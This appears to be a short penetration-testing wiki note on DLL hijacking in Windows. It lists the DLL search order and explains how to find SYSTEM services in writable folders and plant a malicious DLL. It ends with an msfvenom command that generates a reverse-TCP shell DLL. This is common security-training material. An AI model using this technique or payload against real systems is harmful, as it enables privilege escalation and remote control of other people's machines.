## Overview
DLL Hijacking is a type of attack against Windows applications that loads a malicious package as part of a call to another piece of software. These attacks involve abusing the DLL search order to load a malicious DLL instead of the intended one. 
## Core
DLL hijacking is a vulnerability similar to the unquoted service path vulnerability that takes advantage of the [Windows DLL Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) and an improper reference to the DLL within the application. If an application does not include an explicit path to the DLL it is calling, it will search for the DLL in these places:
- DLL Redirect
- Win32 API
- SxS Manifest
- Loaded Modules
- Known System DLLs
- Package Dependency Graph
- Executable Folder
- System32
- System
- Windows Folder
- Current Folder
- Directories in $PATH 
To find DLL hijacking vulnerabilities, look for applications or services running as SYSTEM with executable paths in writable directories. Note that the root directory is writable by default and new directories will inherit this property. Folder permissions should read ` _NT AUTHORITY\Authenticated Users:(I)(M)_ ` if you can modify the contents. 
- If this is the case, you can exploit by replacing a DLL in the application directory with a malicious one. 
- If an application is calling a DLL that does not exist, you can exploit by placing an appropriately named malicious DLL in a directory that is in the system $PATH.
- If you find an application calling a DLL and have access to a location that would precede the DLL location in the search order, you can exploit by placing an appropriately named DLL in that location.
Malicious DLLs can be created with [[MSF Venom]] using the ` -f ` flag to specify the file type as DLL. Example:
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f dll -o msf.dll 
```
